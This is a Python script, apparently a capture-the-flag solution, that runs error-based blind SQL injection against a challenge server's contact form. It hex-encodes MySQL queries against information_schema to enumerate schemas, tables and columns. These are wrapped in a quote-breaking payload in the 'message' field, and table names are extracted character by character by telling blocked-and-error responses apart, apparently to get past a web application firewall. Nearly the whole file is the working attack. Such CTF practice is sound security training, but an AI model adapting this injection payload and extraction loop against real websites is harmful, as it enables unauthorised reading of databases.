import requests
from search.deep_error_search import deep_error_search, string_to_hexstring as s2h
from search.deep_time_search import deep_time_search
from search.linear_time_search import linear_time_search
from search.offset_time_search import offset_time_search


# db
# QUERY = "SELECT 1=1 FROM information_schema.schemata WHERE HEX(schema_name) LIKE 0x{}25"
# table
# QUERY = "SELECT 1=1 FROM information_schema.tables WHERE HEX(table_name) LIKE 0x{}25 AND table_schema = DATABASE()"
# QUERY = "SELECT 1=1 FROM information_schema.tables WHERE HEX(table_name) LIKE 0x{}25 AND table_type = 0x" + s2h('BASE TABLE')
# column
# QUERY = "SELECT 1=1 FROM information_schema.columns WHERE HEX(column_name) LIKE 0x{}25 AND table_name = 0x" + s2h('threads') + ""
# value
# QUERY = "SELECT 1=1 FROM threads WHERE HEX(TYPE) LIKE 0x{}25"


# db
# QUERY = "SELECT 1=1 FROM information_schema.schemata WHERE HEX(schema_name) LIKE 0x{}25"
# table
QUERY = "SELECT 1=1 FROM information_schema.tables WHERE SUBSTR(HEX(table_name), 1, {}) = 0x{} AND table_type = 0x" + s2h('BASE TABLE') + " LIMIT 1 OFFSET 1"
# column
# QUERY = "SELECT 1=1 FROM information_schema.columns WHERE HEX(column_name) LIKE 0x{}25 AND table_name = 0x" + s2h('threads') + ""
# value
# QUERY = "SELECT 1=1 FROM threads WHERE HEX(TYPE) LIKE 0x{}25"
QUERY = f"\\' LIKE IF(( {QUERY} ), null, 0x58) ) -- "



def send_request(value:str):
  url = "http://modinsecurity.challs.cyberchallenge.it:80/"
  data = {"name": "a", "email": "a@gmail.com", "phone": "a", "message": QUERY.format(len(value), s2h(value))}
  r = requests.post(url, data=data)
  blocked = 'Your request have been blocked!' in r.text
  error = '[MySQL Error]' in r.text
  # print('blocked:', blocked)
  # print('error:', error)
  if blocked and error:
    # print('response:', r.text)
    return True

print(deep_error_search(send_request, starting_value=''))